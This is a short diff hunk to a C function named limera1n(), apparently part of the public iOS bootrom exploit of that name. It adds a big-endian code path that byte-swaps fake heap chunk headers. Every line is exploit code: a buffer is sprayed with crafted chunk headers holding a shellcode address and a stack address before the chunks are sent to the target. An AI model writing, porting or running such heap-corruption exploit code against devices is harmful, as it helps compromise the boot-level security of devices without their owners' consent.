@@ -110,11 +110,19 @@ int limera1n() {
 
 	memset(buf, 0xCC, 0x800);
 	for(i = 0; i < 0x800; i += 0x40) {
-		unsigned int* heap = (unsigned int*)(buf+i);
-		heap[0] = 0x405;
-		heap[1] = 0x101;
-		heap[2] = shellcode_address;
-		heap[3] = stack_address;
+                unsigned int* heap = (unsigned int*)(buf+i);
+
+#ifdef BIG_ENDIAN
+               heap[0] = __builtin_bswap32(0x405);
+               heap[1] = __builtin_bswap32(0x101);
+               heap[2] = __builtin_bswap32(shellcode_address);
+               heap[3] = __builtin_bswap32(stack_address);
+#else
+                heap[0] = 0x405;
+                heap[1] = 0x101;
+                heap[2] = shellcode_address;
+                heap[3] = stack_address;
+#endif
 	}
 
 	printf("Sending chunk headers\n");
